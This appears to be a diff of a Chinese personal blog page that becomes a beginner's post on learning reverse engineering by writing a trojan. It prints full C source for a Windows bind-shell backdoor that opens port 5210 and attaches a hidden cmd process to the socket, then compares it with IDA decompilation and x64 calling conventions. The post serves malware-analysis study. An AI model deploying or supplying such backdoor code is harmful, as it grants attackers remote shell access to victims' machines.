@@ -5,7 +5,7 @@
 	<meta charset="utf-8">
 	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
 	
-	<title>清夜无尘の一方天地 </title>
+	<title>清夜无尘の一方天地  | 从正向木马编写看逆向工程</title>
 	<meta name="viewport" content="width=device-width,minimum-scale=1">
 	<meta name="generator" content="Hugo 0.128.0">
 	
@@ -27,9 +27,6 @@
 
 	
 
-	
-	<link rel="alternate" href="/tags/%E6%8A%80%E6%9C%AF/index.xml" type="application/rss+xml" title="清夜无尘の一方天地">
-	<link rel="feed" href="/tags/%E6%8A%80%E6%9C%AF/index.xml" type="application/rss+xml" title="清夜无尘の一方天地">
 	
 	
 	
@@ -148,23 +145,178 @@ onload='renderMathInElement(document.body);'></script>
 		<header class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-1 md:order-1 max-w-2xl">
 			<div
 				class="z-50 bg-gray-100 bg-opacity-75 bg-opacity-custom lg:min-w-0.7 max-w-xl md:float-right md:text-right leading-loose tracking-tight md:sticky md:top-0 pt-2">
-					<div class="pb-4">
-		<h1 >
-			<a href="https://wander1ng.com/" title="清夜无尘の一方天地" class="heading font-cursive icon">清夜无尘の一方天地</a>
-		</h1>
-	</div>
+				
+<div>
+	<h2>
+		<a href="https://wander1ng.com/" title="清夜无尘の一方天地" class="heading font-cursive icon">清夜无尘の一方天地</a>
+	</h2>
+</div>
+<h1 class="pt-2">从正向木马编写看逆向工程</h1>
+
+<h3 class="text-java-700 font-normal leading-relaxed pt-2">新手村知识</h3>
+
+<div class="flex flex-wrap justify-end pt-2 "><div class="md:flex-grow-0 font-light">
+	
+
+	
+
+	
+	
+	
+	
+	<a class="post-taxonomy-tag text-eucalyptus-500"
+		href='/tags/%E6%8A%80%E6%9C%AF'>技术</a>
+	
+	
+	
+</div><time class="text-eucalyptus-500 md:text-right md:flex-grow font-light pl-4"
+		datetime="2020-11-26T20:11:59&#43;08:00">2020-11-26</time>
+</div>
+
+<hr />
+
+
+			</div>
+		</header>
+		<main role="main" class="w-full md:w-3/5 xl:w-1/2 max-w-3xl order-2 md:order-2 min-h-70vh pt-2 pb-4">
+			
+
+<article>
+	<section class="mx-auto content">
+		<div class="c-rich-text"><p>​	提高样本分析能力，最重要的事情之一就是先正向编写木马。之前简单编译过一个程序，今天搜了一个非常简单的后门，比较一下反编译的结果和源码的区别。</p>
+<p>​	源码如下。</p>
+<pre tabindex="0"><code>#pragma comment(lib,&#34;ws2_32.lib&#34;)  //这里我们静态加入一个lib文件，也就是ws2_32.lib&lt;/font&gt;
+
+#pragma comment(linker,&#34;/subsystem:\&#34;windows\&#34;/entry:\&#34;mainCRTStartup\&#34;&#34;) //设置连接器选项
+
+#include &lt;winsock2.h&gt; //包含头文件winsock2.h,这个是 windows socket的头文件
+
+#include &lt;windows.h&gt; //常用的，不解释
+
+#define MasterPort 5210 //定义一个常量，也就是我们后面要打开的端口
+
+main()   //主函数不解释
+{
+  WSADATA WSADa; //这个结构被用来存储被WSAStartup函数调用后返回的Windows Sockets数据。后面的基本上差不多就不解释，不懂请大家自行百度
+  sockaddr_in SockAddrIn; 
+  SOCKET CSocket,SSocket;
+  int iAddrSize;
+  PROCESS_INFORMATION ProcessInfo;
+  STARTUPINFO StartupInfo;
+  char szCMDPath[255];
+  
+  //分配内存，初始化数据
+  ZeroMemory(&amp;ProcessInfo,sizeof(PROCESS_INFORMATION));
+  ZeroMemory(&amp;StartupInfo,sizeof(STARTUPINFO));
+  ZeroMemory(&amp;WSADa,sizeof(WSADATA));
+
+  //获取cmd路径
+  GetEnvironmentVariable(&#34;COMSPEG&#34;,szCMDPath,sizeof(szCMDPath));
+
+  //加载ws2_32.dll
+  WSAStartup(0x0202,&amp;WSADa);
+
+  //设置本地信息和绑定协议,建立socket,代码如下:
+  SockAddrIn.sin_family = AF_INET;
+  SockAddrIn.sin_addr.s_addr = INADDR_ANY;
+  SockAddrIn.sin_port = htons(MasterPort);
+  CSocket = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,0,0);
+
+  //设置绑定端口，将SockAddrIn绑定到CSocket。
+  bind(CSocket,(sockaddr *)&amp;SockAddrIn,sizeof(SockAddrIn));
+
+  //设置服务器端监听端口
+  listen(CSocket,1);
+  iAddrSize = sizeof(SockAddrIn);
+
+  //开始连接远程服务器，并配置隐藏窗口结构体
+  SSocket = accept(CSocket,(sockaddr *)&amp;SockAddrIn,&amp;iAddrSize);
+
+  StartupInfo.cb = sizeof(STARTUPINFO);
+
+  StartupInfo.wShowWindow = SW_HIDE;
+  
+  StartupInfo.dwFlags = STARTF_USESTDHANDLES |
+
+  STARTF_USESHOWWINDOW;
+
+  StartupInfo.hStdInput = (HANDLE)SSocket;
+
+  StartupInfo.hStdOutput = (HANDLE)SSocket;
+
+  StartupInfo.hStdError = (HANDLE)SSocket;
+  
+  //创建匿名管道：
+
+  CreateProcess(NULL, szCMDPath, NULL, NULL, TRUE, 0, NULL, NULL, &amp;StartupInfo, &amp;ProcessInfo);
+
+  WaitForSingleObject(ProcessInfo.hProcess, INFINITE);
+
+  CloseHandle(ProcessInfo.hProcess);
+
+  CloseHandle(ProcessInfo.hThread);
+
+ 
+
+  //关闭进程句柄：
+
+  closesocket(CSocket);
+
+  closesocket(SSocket);
+
+  WSACleanup();
+
+    //关闭连接卸载ws2_32.dll
+
+  return 0;
+
+  }
+</code></pre><p>实际IDA反编译出来的效果如下：</p>
+<p><img src="https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/12/14579c8d6365d8c8ebbc49c59bfc8563.png" alt=""></p>
+<p>可以看到反编译的结果，库的导入和局部变量的定义是没有的，应该是编译过程中，在链接操作之前这些就已经执行完成了。</p>
+<p>简单来说这个程序的功能就是开放5210端口，并监听。然后把输入重定向到新起cmd进程，并把cmd进程的输出重定向到5210端口。</p>
+<h5 id="对64位下传参的测试">对64位下传参的测试</h5>
+<p><img src="https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/12/4df417ee0c925a50506052e490c72dfa.png" alt=""></p>
+<p>传4个参数及以下，使用的是寄存器传参，cd89，第一个参数传到c，第二个参数传到d，第三个参数传到8，第四个参数传到9。从顺序上来看，从右往左，先从第四个开始传，再从第三个开始传&hellip;</p>
+<p><img src="https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/12/7cfa50c168c605c3f3c348bc87cc3891.png" alt=""></p>
+<p>传5个参数及以上，前四个使用寄存器传参，从第五个开始使用堆栈传参(上图是传完了之后的结果，汇编侧可以看到寄存器的使用)。可以看到第五个参数先使用了寄存器将参数从rbp-14h中取出来(寻址方式。反映变化趋势的方面，栈由高地址向低地址生长，参数由低地址向高地址生长。x64dbg的上面是栈顶低地址下面是栈底高地址)。</p>
+<p><img src="https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/12/d8c9290af6a1335497314da67801034c.png" alt=""></p>
+<p>然后又赋给了rsp+20，最后把eax中存放的第一个参数赋给ecx。</p>
+<p><img src="C:%5CUsers%5Clizhenxin%5CAppData%5CRoaming%5CLanxinSoftCustom%5CLxResource%5CImages%5C0880c08b0110ebe3d330.png" alt="0880c08b0110ebe3d330"></p>
+<p>比较奇怪的是为什么不在栈顶。</p>
+<h5 id="基础知识">基础知识</h5>
+<ol>
+<li>StartupInfo结构体，主要用于创建新进程时，指定该进程的主窗口特性。主要指定窗口显示状态、窗口位置和大小、窗口标题和其他属性。</li>
+<li>获取cmd的绝对路径可以使用GetEnvironmentVariableA(&ldquo;COMSPEC&rdquo;, Buffer, 0xFFu)。</li>
+<li>C语言的强制类型转换：(typename)  expression，typename为新类型名称，expression为表达式。</li>
+<li>返回地址的存储，因为是由主调函数进行的压栈操作，所以x64dbg的栈区分，将存储返回地址的部分算作上一个栈。</li>
+<li>UTF-8 是 Unicode 的实现方式之一。</li>
+</ol>
+</div>
+	</section>
+
+
+</article>
+
+		</main>
+		<div class="w-full h-0 flex-none order-3"></div>
+		<aside role="contentinfo"
+			class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-4 md:order-3 md:sticky md:bottom-0 self-end max-w-2xl">
+			<div class="md:float-right md:text-right leading-loose tracking-tight md:mb-2">
+				
+	<div class="md:max-w-xs  flex flex-col md:items-end">
 	<ul class="font-serif flex-grow-0 flex justify-between flex-wrap md:flex-col">
 	
 	
 	<li class="px-1 md:px-0">
-		<a href="/post/" title="Post page" >
+		<a href="/post/" title="Post page" 
+			class="font-medium text-medium-red-violet-600 hover:text-medium-red-violet-400" >
 			Post
 		</a>
 	</li>
 	
 	<li class="px-1 md:px-0">
-		<a href="/tags/" title="Tags page" 
-			class="font-medium text-medium-red-violet-600 hover:text-medium-red-violet-400" >
+		<a href="/tags/" title="Tags page" >
 			Tags
 		</a>
 	</li>
@@ -175,10 +327,6 @@ onload='renderMathInElement(document.body);'></script>
 		</a>
 	</li>
 	
-	
-	<li>
-		<a href='/tags/%E6%8A%80%E6%9C%AF/index.xml'>RSS</a>
-	</li>
 	
 	
 	
@@ -192,197 +340,6 @@ onload='renderMathInElement(document.body);'></script>
 	</div>
 	
 </ul>
-			</div>
-		</header>
-		<main role="main" class="w-full md:w-3/5 xl:w-1/2 max-w-3xl order-2 md:order-2 min-h-70vh pt-2 pb-4">
-			
-<h1 class="pb-4">
-	技术
-</h1>
-<div>
-	<section>
-		
-		<div>
-			<div class="pb-8">
-	<div class="font-serif font-medium text-xl">
-		<a href="https://wander1ng.com/post/blockchain%E6%9C%AF%E8%AF%AD/">
-			区块链&amp;BTCのtutorial
-		</a>
-	</div>
-	
-	
-	
-	
-	<div class="font-serif text-gray-600 font-light pt-1">
-		BlcokChain</div>
-
-	
-	<div class="flex flex-wrap justify-between pt-1"><div class="md:flex-grow-0 font-light">
-	
-
-	
-
-	
-	
-	
-	
-	<a class="post-taxonomy-tag text-eucalyptus-500"
-		href='/tags/%E6%8A%80%E6%9C%AF'>技术</a>
-	
-	
-	
-</div><time class="text-eucalyptus-500 md:text-right md:flex-grow font-light"
-			datetime="2024-12-10T18:01:48&#43;08:00">2024-12-10</time>
-	</div>
-</div>
-
-		</div>
-		
-		<div>
-			<div class="pb-8">
-	<div class="font-serif font-medium text-xl">
-		<a href="https://wander1ng.com/post/%E4%BB%8E%E6%AD%A3%E5%90%91%E6%9C%A8%E9%A9%AC%E7%BC%96%E5%86%99%E7%9C%8B%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/">
-			从正向木马编写看逆向工程
-		</a>
-	</div>
-	
-	
-	
-	
-	<div class="font-serif text-gray-600 font-light pt-1">
-		新手村知识</div>
-
-	
-	<div class="flex flex-wrap justify-between pt-1"><div class="md:flex-grow-0 font-light">
-	
-
-	
-
-	
-	
-	
-	
-	<a class="post-taxonomy-tag text-eucalyptus-500"
-		href='/tags/%E6%8A%80%E6%9C%AF'>技术</a>
-	
-	
-	
-</div><time class="text-eucalyptus-500 md:text-right md:flex-grow font-light"
-			datetime="2020-11-26T20:11:59&#43;08:00">2020-11-26</time>
-	</div>
-</div>
-
-		</div>
-		
-	</section>
-</div>
-
-		</main>
-		<div class="w-full h-0 flex-none order-3"></div>
-		<aside role="contentinfo"
-			class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-4 md:order-3 md:sticky md:bottom-0 self-end max-w-2xl">
-			<div class="md:float-right md:text-right leading-loose tracking-tight md:mb-2">
-				
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<div class="md:max-w-xs  flex flex-col md:items-end pt-2">
 	
 
 <div class="flex flex-wrap-reverse md:justify-end content-end md:content-start justify-start items-start md:flex-col  max-h-16">
@@ -500,25 +457,66 @@ onload='renderMathInElement(document.body);'></script>
 	
 </div>
 
-	<div class="a-gray text-sm text-gray-500 leading-tight">
+	<div class="text-sm text-gray-500 leading-tight a-gray">
 		Copyright © 2019–2024
 		<br />
-		Built with Hugo and theme <a 
-			href="https://github.com/heyeshuang/hugo-theme-tokiwa">Tokiwa</a>.
-			<br />
-			49 pages, 48789 words in total.
+		Built with Hugo and theme <a href="https://github.com/heyeshuang/hugo-theme-tokiwa">Tokiwa</a>. 1242 words in this page.
 	</div>
 </div>
+
 			</div>
 		</aside>
 		<footer class="w-full md:w-3/5 xl:w-1/2 order-3 max-w-3xl md:order-4 pt-2">
 			
+<hr class="double-line" />
+<div class="flex flex-wrap justify-between pb-2 leading-loose font-serif">
+    
+    <a class="flex-grow-0" href="/post/%E4%BA%92%E8%81%94%E7%BD%91%E5%8D%8F%E8%AE%AE%E5%85%A5%E9%97%A8/">
+        <svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24"
+            height="24">
+            <path fill="none" d="M0 0h24v24H0z" />
+            <path d="M7.828 11H20v2H7.828l5.364 5.364-1.414 1.414L4 12l7.778-7.778 1.414 1.414z" /></svg>
+        互联网协议入门
+    </a>
+    
+    
+    <a class="flex-grow-0" href="/post/%E5%A4%A7%E7%AB%AF%E5%BA%8F%E4%B8%8E%E5%B0%8F%E7%AB%AF%E5%BA%8F/">
+        大端序与小端序
+        <svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24"
+            height="24">
+            <path fill="none" d="M0 0h24v24H0z" />
+            <path d="M16.172 11l-5.364-5.364 1.414-1.414L20 12l-7.778 7.778-1.414-1.414L16.172 13H4v-2z" /></svg></a>
+    
+</div>
+<div >
 
 
 
-
-
-
+</div>
+<hr />
+<div class="pb-2">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "LZX" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+<hr />
 
 		</footer>
 		
